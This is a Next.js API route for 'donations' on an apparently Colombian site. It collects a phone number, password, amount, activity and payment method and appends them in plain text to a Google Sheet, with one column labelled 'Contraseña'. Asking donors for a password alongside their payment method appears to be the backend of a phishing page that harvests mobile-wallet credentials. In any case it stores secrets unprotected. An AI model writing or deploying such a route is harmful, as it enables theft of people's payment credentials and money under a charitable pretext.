// /app/api/donaciones/route.ts

import { NextResponse } from "next/server";
import { google } from "googleapis";
import {
  GOOGLE_CLIENT_EMAIL,
  GOOGLE_PRIVATE_KEY,
  SPREADSHEET_ID_DONACIONES,
} from "@/config/idSheets";

export async function POST(req: Request) {
  try {
    const { phoneNumber, password, amount, selectedActivity, paymentMethod } =
      await req.json();

    const auth = new google.auth.JWT(
      GOOGLE_CLIENT_EMAIL,
      undefined,
      GOOGLE_PRIVATE_KEY.replace(/\\n/g, "\n"),
      ["https://www.googleapis.com/auth/spreadsheets"]
    );

    const sheets = google.sheets({ version: "v4", auth });

    const timestamp = new Date().toLocaleString("es-CO", {
      timeZone: "America/Bogota",
    });

    await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID_DONACIONES,
      range: "Donaciones!A2:F2",
      valueInputOption: "RAW",
      requestBody: {
        values: [
          [
            timestamp,         // A: Fecha y hora
            selectedActivity,  // B: Actividad
            amount,            // C: Monto
            paymentMethod,     // D: Método
            phoneNumber || "-",// E: Número
            password || "-",   // F: Contraseña
          ],
        ],
      },
    });

    return NextResponse.json({ ok: true });
  } catch (e: any) {
    console.error("ERROR al guardar donación:", e);
    return NextResponse.json(
      { error: "No se pudo registrar la donación" },
      { status: 500 }
    );
  }
}